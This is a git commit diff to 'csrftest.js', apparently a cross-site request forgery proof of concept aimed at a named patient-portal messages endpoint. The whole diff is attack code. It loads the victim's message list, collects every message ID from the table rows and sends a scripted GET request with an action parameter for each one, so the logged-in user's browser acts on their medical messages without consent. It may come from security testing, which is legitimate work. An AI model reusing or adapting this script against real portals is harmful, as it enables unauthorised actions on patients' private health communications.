cda42d2ed3b753b146fa47ee3d72ce547ad6ca8c
cybertron10 <56225601+cybertron10@users.noreply.github.com>
2020-08-22 14:30:05 -0400

    Update csrftest.js

--- csrftest.js
+++ csrftest.js
@@ -5,13 +5,17 @@ var req2 = new XMLHttpRequest();
 req.onreadystatechange = function()
 {
 if (req.readyState == 4 && req.status == 200 )
-{
- for (i=2; i < 20; i++){
-  var msgId = document.querySelector("table tr:nth-child(i)").id;
-  req2.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&nact=1&msgid="+msgId, true);
-  req2.send();
- }
-}
+  {
+  var myStringArray = $('tbody tr[id]').map(function() {
+  return this.id;
+      });
+  var arrayLength = myStringArray.length;
+  for (var i = 0; i < arrayLength; i++) {
+    console.log(myStringArray[i]);
+     req2.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&nact=1&msgid="+myStringArray[i], true);
+     req2.send();
+      }
+   }
 };
 
 req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp");
